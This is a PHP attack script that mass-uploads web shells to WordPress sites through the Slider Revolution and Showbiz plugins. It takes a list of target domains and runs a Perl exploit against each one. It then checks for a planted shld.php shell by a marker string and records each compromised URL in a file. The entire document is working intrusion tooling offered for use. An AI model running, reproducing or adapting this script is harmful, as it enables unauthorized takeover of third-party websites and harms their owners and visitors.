<?php
/*
Codec By Tr3v0r
Mass upload shell Slider Revolution Showbiz
Twitter: @MatheusTDashh / @druserx
Thanks: constantine - ph4x35 - bia
*/
	
	error_reporting(0);
	
	if ($_SERVER['argc'] != 2)
		die("Use: php ". $_SERVER['argv'][0] ." domain-list.txt\n");
	
	save_shell("");
	if (($fp = fopen($_SERVER['argv'][1], 'r')) !== false) {
		while (!feof($fp)) {
			$line = str_replace(array("\n", "\r"), '', fgets($fp));
			if (strlen($line)) {
				system("perl update.pl http://{$line} revslider");
				$response = get_response_data("http://{$line}/wp-content/plugins/revslider/temp/update_extract/revslider/shld.php");
				if (strstr($response, 'C0NS7BR'))
					save_shell("http://{$line}/wp-content/plugins/revslider/temp/update_extract/revslider/shld.php\n");
				
				system("perl update.pl http://{$line} showbiz");
				$response = get_response_data("http://{$line}/wp-content/plugins/showbiz/temp/update_extract/showbiz/shld.php");
				if (strstr($response, 'C0NS7BR'))
					save_shell("http://{$line}/wp-content/plugins/showbiz/temp/update_extract/showbiz/shld.php\n");
			}
		}
		fclose($fp);
	} else
		die("Error to open file.\n");
	
	function get_response_data ($url) {
		$result = ""; $ch = curl_init();
		if ($ch) {
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/1.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0');
			$result = curl_exec($ch);
			curl_close($ch);
		}
		return $result;
	}
	
	function save_shell ($buffer) {
		if (($fp = fopen("shells_uploaded.txt", "a+")) !== false) {
			fwrite($fp, $buffer);
			fclose($fp);
		}
	}
	
?>
